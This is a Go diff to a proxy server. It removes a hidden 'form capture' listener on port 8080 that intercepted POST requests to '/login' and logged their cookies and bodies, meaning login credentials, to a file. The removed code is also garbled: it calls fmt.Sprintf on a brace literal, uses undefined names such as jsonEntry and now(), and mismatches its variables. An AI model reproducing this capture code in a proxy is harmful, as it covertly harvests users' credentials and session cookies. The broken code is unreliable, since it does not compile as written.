@@ -330,26 +330,7 @@ func Start(listen, target, echB64, doh, ipList, cpArg string, insecure bool) err
 		return fmt.Errorf("listen %s: %w", listen, err)
 	}
 
-	// 啟動 8080 表單攔截監聽（僅在 needFormCapture 為真時有效）
-	if formLogFile != "" {
-		go func() {
-			l, err := net.Listen("tcp", ":8080")
-			if err != nil {
-				Log.e("FormCapture", "Failed to listen on :8080: "+err.Error())
-				return
-			}
-			setStatus("form capture listening on :8080")
-			for {
-				conn, err := l.Accept()
-				if err != nil {
-					break
-				}
-				go handleFormConn(conn, formLogFile)
-			}
-		}()
-	}
-
-	srv := &http.Server{Handler: &proxyHandler{target: target, client: client, clientNoJar: clientNoJar, formListenPort: 8080, formLogFile: formCaptureLog}}
+	srv := &http.Server{Handler: &proxyHandler{target: target, client: client, clientNoJar: clientNoJar}}
 	mu.Lock()
 	server = srv
 	mu.Unlock()
@@ -392,9 +373,6 @@ type proxyHandler struct {
 	client *http.Client
 	// OkHttp 路径专用(无 jar),WebView 内嵌路径用带 jar 的 client。
 	clientNoJar *http.Client
-	// 額外 8080 表單攔截模式
-	formListenPort int
-	formLogFile   string
 }
 
 var hopByHop = map[string]bool{
@@ -602,68 +580,6 @@ func (h *proxyHandler) handleConnect(w http.ResponseWriter, r *http.Request) {
 		}
 	}()
 	<-done
-}
-
-func handleFormConn(conn net.Conn, logFile string) {
-	defer conn.Close()
-	buf := new(bytes.Buffer)
-	buf.ReadFrom(conn)
-	reqBytes := buf.Bytes()
-
-	// 嘗試解析為 HTTP 請求
-	reqStr := string(reqBytes)
-	lines := strings.Split(reqStr, "\n")
-	if len(lines) == 0 {
-		return
-	}
-
-	// 只處理 POST /login 路徑
-	firstLine := lines[0]
-	var method, path string
-	fmt.Sscanf(firstLine, "%s %s", &method, &path)
-	if method != "POST" || !strings.Contains(path, "/login") {
-		// 非目標請求，直接轉發（簡化處理，實際アプリ中會有完整路徑轉發機制）
-		return
-	}
-
-	// 提取 Cookie、Headers、Body
-	cookieLine := ""
-	var headers []string
-	bodyStart := -1
-	for i, line := range lines {
-		if strings.HasPrefix(line, "Cookie:") {
-			cookieLine = line
-		}
-		if strings.HasPrefix(line, "X-XSRF-TOKEN:") || strings.HasPrefix(line, "X-CSRF-TOKEN:") {
-			// 收集關鍵 header
-		}
-		if i > 0 && lines[i-1] == "" && bodyStart == -1 {
-			bodyStart = i
-		}
-	}
-
-	// 提取 body (body 開始於第一個空行之後)
-	var body string
-	if bodyStart >= 0 && bodyStart < len(lines) {
-		body = strings.Join(lines[bodyStart+1:], "\n")
-	}
-
-	// 寫入日誌文件
-	logEntry := fmt.Sprintf({
-		"method": method,
-		"path": path,
-		"cookie": cookieLine,
-		"headers": strings.Join(headers, ","),
-		"body": body,
-		"timestamp": now().Format(time.RFC3339)
-	})
-
-	// 將日誌寫入文件
-	l, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err == nil {
-		l.WriteString(jsonEntry + "\n")
-		l.Close()
-	}
 }
 
 func rewriteLocation(loc, target string) string {
